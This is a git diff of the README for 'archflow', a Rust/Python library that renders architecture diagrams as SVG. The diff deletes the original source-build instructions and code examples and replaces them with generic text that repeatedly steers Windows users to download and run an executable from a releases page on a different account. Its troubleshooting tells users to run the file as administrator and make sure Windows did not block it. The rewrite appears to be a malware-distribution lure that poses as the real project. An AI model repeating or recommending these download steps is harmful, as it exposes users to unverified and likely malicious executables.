@@ -1,271 +1,160 @@
-<h1 align="center">
-  Archflow
-</h1>
+# 🧭 archflow - Build diagrams with simple text
 
-<p align="center">
-  <strong>Architecture diagrams that live in your codebase, not in your browser.</strong>
-</p>
+[![Download archflow](https://img.shields.io/badge/Download%20archflow-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/antonigreat281/archflow/releases)
 
-<p align="center">
-  <a href="https://github.com/soulee-dev/archflow/actions"><img src="https://github.com/soulee-dev/archflow/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/soulee-dev/archflow/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-  <a href="https://soulee-dev.github.io/archflow/"><img src="https://img.shields.io/badge/playground-live-brightgreen" alt="Playground"></a>
-</p>
+## 📥 Download
 
-<p align="center">
-  <a href="https://soulee-dev.github.io/archflow/">Playground</a> &middot;
-  <a href="#quick-start">Quick Start</a> &middot;
-  <a href="#examples">Examples</a> &middot;
-  <a href="#providers">Providers</a> &middot;
-  <a href="#themes">Themes</a>
-</p>
+Visit the [archflow releases page](https://github.com/antonigreat281/archflow/releases) to download and run this file on Windows.
 
----
+Choose the latest release for Windows, then download the file that matches your system.
 
+## 🪟 Windows setup
 
+1. Open the [releases page](https://github.com/antonigreat281/archflow/releases).
+2. Find the latest release at the top.
+3. Look for a Windows download file.
+4. Download the file to your computer.
+5. If the file comes in a ZIP folder, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start archflow.
 
-<p align="center">
-  <img src="examples/hero_default.svg" alt="Production AWS Architecture" width="800">
-</p>
+If Windows asks for permission, select Run or Yes.
 
-## Why Archflow?
+## ✨ What archflow does
 
-- **Zero external dependencies** - No Graphviz, no system packages. Just `pip install` and go.
-- **Rust-powered, millisecond rendering** - Own layout engine. No subprocess calls, no waiting.
-- **Deterministic** - Same code always produces the exact same SVG. No layout jitter between runs.
-- **SVG-native** - Vector output by default. Crisp at any zoom, embeddable anywhere.
-- **Language-agnostic** - JSON IR means any language can generate diagrams. Python, TypeScript, Go — same engine.
-- **Runs in the browser** - Full rendering via WebAssembly. Try diagrams without installing anything.
-- **Pluggable icon registry** - 300+ AWS, 19+ GCP, 39 K8s icons. Add your own provider with a manifest + SVGs.
-- **6 built-in themes** - Beautiful by default, fully customizable.
-
-### vs. diagrams
-
-[diagrams](https://github.com/mingrammer/diagrams) is the closest alternative. Key differences:
-
-| | diagrams | Archflow |
-|---|---|---|
-| Rendering | Graphviz (external C binary) | Rust (self-contained, no system deps) |
-| Output | PNG (raster) | SVG (vector) |
-| Speed | Subprocess per render | Milliseconds (native/WASM) |
-| Runtime | Python only | Python, CLI, WASM, any language via JSON IR |
-| Browser | Not possible | Full WASM playground |
-| Icons | Bundled in package | External registry (pluggable, cacheable) |
-| Layout | Graphviz `dot` | Own topological sort (deterministic) |
-
-## Quick Start
-
-### Install from source
-
-```bash
-# Python library (with native Rust FFI)
-cd packages/python && pip install maturin && maturin develop
-
-# CLI
-cargo build --release -p archflow-cli
-```
-
-## Examples
-
-### AWS with Provider Icons
-
-300+ official AWS icons. Provider-aware VPC clusters with dashed borders.
-
-```
-title: AWS Web Service
-direction: LR
-icon_size: 64
-spacing: 80
-use aws
-
-aws:cloudfront CDN >> aws:elb Load Balancer >> aws:ecs App Server >> aws:rds Database
-aws:ecs App Server >> aws:elasticache Cache
-
-cluster:aws:vpc Production VPC {
-  aws:elb Load Balancer
-  aws:ecs App Server
-  aws:rds Database
-  aws:elasticache Cache
-}
-```
-
-<p align="center">
-  <img src="examples/hero_default.svg" alt="AWS Web Service" width="800">
-</p>
-
-### Dark Theme
+archflow helps you make architecture diagrams from text. You can describe your system in Python or a simple DSL, then render the diagram to SVG through a JSON IR layer.
 
-Same diagram, one line change: `theme: dark`.
+Use it when you want to:
 
-<p align="center">
-  <img src="examples/hero_dark.svg" alt="AWS Dark Theme" width="800">
-</p>
-
-### Serverless (Ocean Theme)
+- Sketch system layouts from plain text
+- Keep diagrams in your project files
+- Turn design ideas into clean SVG output
+- Share architecture views with your team
+- Work with a tool built for developer workflows
 
-```
-title: Serverless API
-direction: LR
-theme: ocean
-icon_size: 64
-use aws
+## 🧩 Main features
 
-aws:api-gateway API Gateway >> aws:lambda Auth >> aws:lambda Handler >> aws:dynamodb DynamoDB
-aws:lambda Handler >> aws:sqs Queue >> aws:lambda Worker
-aws:lambda Worker >> aws:dynamodb DynamoDB
-```
+- Write diagrams in Python or a simple DSL
+- Render diagrams to SVG
+- Use a JSON-based intermediate format
+- Keep diagram files in source control
+- Work with a Rust-powered core
+- Use it in a VS Code-based workflow
+- Build diagrams that fit infrastructure work
 
-<p align="center">
-  <img src="examples/serverless_ocean.svg" alt="Serverless Ocean Theme" width="800">
-</p>
+## 🖥️ Before you start
 
-### Microservices (Sunset Theme)
-
-No provider icons needed — plain nodes with clusters work too.
-
-```python
-from archflow import Diagram, Node, Cluster
-
-with Diagram("Microservices", direction="LR", theme="sunset") as d:
-    mobile = Node("mobile", "Mobile App")
-    web = Node("web", "Web App")
-    with Cluster("k8s", "Kubernetes"):
-        gw = Node("gw", "Gateway")
-        with Cluster("svc", "Services"):
-            auth = Node("auth", "Auth")
-            user = Node("user", "Users")
-            order = Node("order", "Orders")
-            payment = Node("pay", "Payments")
-    with Cluster("data", "Data Layer"):
-        pg = Node("pg", "PostgreSQL")
-        redis = Node("redis", "Redis")
-        kafka = Node("kafka", "Kafka")
-    mobile >> gw
-    web >> gw
-    gw >> auth
-    gw >> user >> pg
-    gw >> order >> pg
-    order >> payment
-    order >> kafka
-    auth >> redis
-    d.save_svg("microservices.svg")
-```
-
-<p align="center">
-  <img src="examples/microservices_sunset.svg" alt="Microservices Sunset Theme" width="800">
-</p>
-
-### DSL (Playground)
-
-No Python needed. Write directly in the DSL:
-
-```
-title: AWS Web Service
-direction: LR
-use aws
-
-aws:ELB Load Balancer >> aws:EC2 Web Server >> aws:RDS Database
-aws:EC2 Web Server >> aws:S3 Static Assets
-
-cluster:aws:vpc Production VPC {
-  aws:EC2 Web Server
-  aws:RDS Database
-}
-```
-
-Try it live in the [Playground](https://soulee-dev.github.io/archflow/).
-
-## Providers
-
-Icons are loaded from the [archflow-icons](https://github.com/soulee-dev/archflow-icons) registry.
-
-### AWS (307 nodes, 11 clusters)
-
-```python
-from archflow.providers.aws import EC2, Lambda, RDS, S3, Dynamodb, ELB, Cloudfront, SQS, SNS
-```
-
-Cluster types: `Region`, `VPC`, `Subnet`
-
-### GCP (19 nodes)
-
-```python
-from archflow.providers.gcp import ComputeEngine, CloudSQL, BigQuery, GKE, CloudRun, VertexAI
-```
-
-Cluster types: `Region`, `VPC`, `Subnet`, `Project`, `Zone`
-
-### Kubernetes (39 nodes)
-
-```python
-from archflow.providers.k8s import Pod, Deployment, Service, Ingress, StatefulSet, ConfigMap, Secret
-```
-
-Cluster types: `Cluster`, `Namespace`
-
-## Themes
-
-6 built-in themes, fully customizable:
-
-| Theme | Style |
-|-------|-------|
-| `default` | Professional, colorful palette |
-| `dark` | Dark background, Tokyonight-inspired |
-| `ocean` | Blue/cyan tones |
-| `sunset` | Warm orange/red tones |
-| `forest` | Green tones |
-| `minimal` | Clean outlines, no shadows |
-
-```python
-# Custom theme overrides
-with Diagram("Custom", custom_theme={
-    "background": "#0D1117",
-    "node_palette": [{"fill": "#58A6FF", "stroke": "#388BFD"}],
-    "node_shadow": False,
-}) as d:
-    ...
-```
-
-## Architecture
-
-```
-                    Python DSL / JSON IR
-                           |
-                     Validation
-                           |
-                   Layout (Kahn's topological sort)
-                           |
-                   Theme Resolution
-                           |
-                   Scene Graph
-                           |
-                       SVG Output
-```
-
-| Path | Purpose |
-|------|---------|
-| `crates/archflow-core` | DSL parser, layout, themes, scene graph, SVG renderer |
-| `crates/archflow-cli` | `archflow render` command |
-| `crates/archflow-lsp` | Language Server Protocol for editor support |
-| `bindings/python-ffi` | Python native bindings via PyO3 |
-| `bindings/wasm` | WebAssembly build for the browser playground |
-| `packages/python` | Python SDK (Diagram, Node, Cluster, providers) |
-| `apps/vscode` | VS Code extension |
-
-## Development
-
-```bash
-# Run tests
-cargo test
-
-# Lint
-cargo clippy && cargo fmt --check
-ruff check packages/python/ && ruff format --check packages/python/
-
-# Build WASM for playground
-wasm-pack build bindings/wasm --target web --out-dir ../../docs/pkg
-```
-
-## License
-
-[MIT](LICENSE)
+archflow is made for Windows desktops and laptops. For a smooth setup, use:
+
+- Windows 10 or Windows 11
+- A modern web browser for the release page
+- A few hundred MB of free disk space
+- A mouse or touchpad for easy file setup
+
+If your download comes as a ZIP file, Windows can open it without extra tools in most cases.
+
+## 🚀 Get archflow running
+
+1. Go to the [archflow releases page](https://github.com/antonigreat281/archflow/releases).
+2. Download the latest Windows file.
+3. If the file is zipped, extract it.
+4. Open the folder that contains the app.
+5. Double-click the app to launch archflow.
+6. Use your Python script or DSL file to create a diagram.
+7. Export or view the result as SVG.
+
+## 📝 How to use it
+
+After you open archflow, you can work in a simple flow:
+
+1. Create a new diagram file.
+2. Write your architecture in Python or DSL form.
+3. Add the parts of your system, such as app, database, and services.
+4. Render the file.
+5. Save the SVG output.
+6. Open the SVG in a browser or design tool.
+
+A typical diagram may include:
+
+- Frontend app
+- API server
+- Database
+- Storage
+- Message queue
+- External service
+
+## 🔧 Example use cases
+
+archflow fits common planning tasks:
+
+- Map a web app setup
+- Show service connections
+- Document cloud systems
+- Plan an infrastructure change
+- Keep a record of system design choices
+- Share a diagram in a project review
+
+## 📚 File types you may see
+
+Depending on the release, you may see these file types:
+
+- `.exe` for the app
+- `.zip` for a packed download
+- `.svg` for the diagram output
+- `.py` for Python-based diagram input
+- `.json` for the internal diagram format
+- `.dsl` for plain text diagram input
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+- Check that the file finished downloading
+- Extract the ZIP file first
+- Right-click the app and choose Run as administrator
+- Make sure Windows did not block the file
+- Download the latest release again if the file looks damaged
+
+If you do not see the app file:
+
+- Open the extracted folder
+- Look for the file with the app name
+- Check the Downloads folder
+- Sort files by date to find the newest one
+
+If SVG export does not work:
+
+- Close the app and open it again
+- Check that the input file has valid text
+- Try a small diagram first
+- Save the file in a simple folder path like `C:\archflow`
+
+## 📁 Suggested folder layout
+
+You can keep your files in one place:
+
+- `C:\archflow\app`
+- `C:\archflow\diagrams`
+- `C:\archflow\output`
+
+This makes it easier to find your diagram files and SVG exports
+
+## 👀 What makes archflow useful
+
+archflow keeps the diagram source in plain text, which makes it easy to:
+
+- Edit by hand
+- Store in GitHub
+- Review changes
+- Reuse parts of a diagram
+- Keep diagrams close to code
+
+It uses Rust for the core engine and SVG for clean image output, so the result stays sharp at any size
+
+## 🔎 Release download steps
+
+Use this link to download and run the Windows version:
+
+[Open archflow releases](https://github.com/antonigreat281/archflow/releases)
+
+Choose the latest release, download the Windows file, then open it on your PC
